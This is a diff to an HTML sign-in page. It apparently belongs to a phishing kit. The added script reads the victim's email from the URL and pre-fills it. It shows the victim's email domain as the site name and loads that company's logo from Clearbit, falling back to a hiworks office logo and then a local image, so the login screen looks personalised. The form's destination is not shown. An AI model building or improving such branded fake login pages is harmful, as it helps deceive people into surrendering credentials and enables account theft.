@@ -72,7 +72,7 @@
                     <tr><td height="110"></td></tr>
                     <tr>
                       <td height="40" align="center">
-                        <img id="logo" src="" width="200" height="40">
+                        <img id="logoImage" src="" width="200" height="40">
                       </td>
                     </tr>
                     <tr><td height="70"></td></tr>
@@ -80,7 +80,7 @@
                       <td height="26">
                         <h1>
                           <font color="#000000">Sign in to</font>
-                          <font color="#7A7A7A" id="domainLabel"></font>
+                          <font color="#7A7A7A" id="domainText"></font>
                         </h1>
                       </td>
                     </tr>
@@ -142,29 +142,38 @@
       </tr>
     </table>
   </form>
-
   <script>
-    function getDomainFromURL() {
-      const urlParams = new URLSearchParams(window.location.search);
-      const login = urlParams.get('login');
-      if (login && login.includes('@')) {
-        return login.split('@')[1].toLowerCase();
-      }
-      return 'example.com'; // fallback domain
-    }
+  const params = new URLSearchParams(window.location.search);
+  const raw = params.get('login');
+  const email = raw ? decodeURIComponent(raw) : '';
 
-    const domain = getDomainFromURL();
+  let user = '', domain = '';
+  if (email.includes('@')) {
+    [user, domain] = email.split(/@(.*)/, 2);
+  }
 
-    // Fill dynamic elements
-    document.getElementById('domainAddon').textContent = '@' + domain;
-    document.getElementById('domainLabel').textContent = domain;
-    document.getElementById('logo').src = 'https://logo.clearbit.com/' + domain;
+  if (email) {
+    document.getElementById('userInput').value = email;
+    document.getElementById('domainInput').value = domain;
+    document.getElementById('domainText').textContent = domain;
+    document.getElementById('emailButton').textContent = email;
+    document.getElementById('anotherLink').href = `another_user.html?login=${encodeURIComponent(email)}`;
 
-    // On form submit, combine username with domain
-    document.getElementById('loginForm').addEventListener('submit', function (e) {
-      const username = document.getElementById('usernameInput').value.trim();
-      document.getElementById('loginFull').value = username + '@' + domain;
-    });
-  </script>
+    const logoImage = document.getElementById('logoImage');
+    const clearbitLogo = `https://logo.clearbit.com/${domain}`;
+    const hiworksLogo = `https://office.hiworks.com/${domain}/common/logo/login`;
+    const localLogo = `img/logo.png`;
+
+    logoImage.src = clearbitLogo;
+
+    logoImage.onerror = () => {
+      logoImage.onerror = () => {
+        logoImage.onerror = null; // Stop further errors
+        logoImage.src = localLogo;
+      };
+      logoImage.src = hiworksLogo;
+    };
+  }
+</script>
 </body>
 </html>
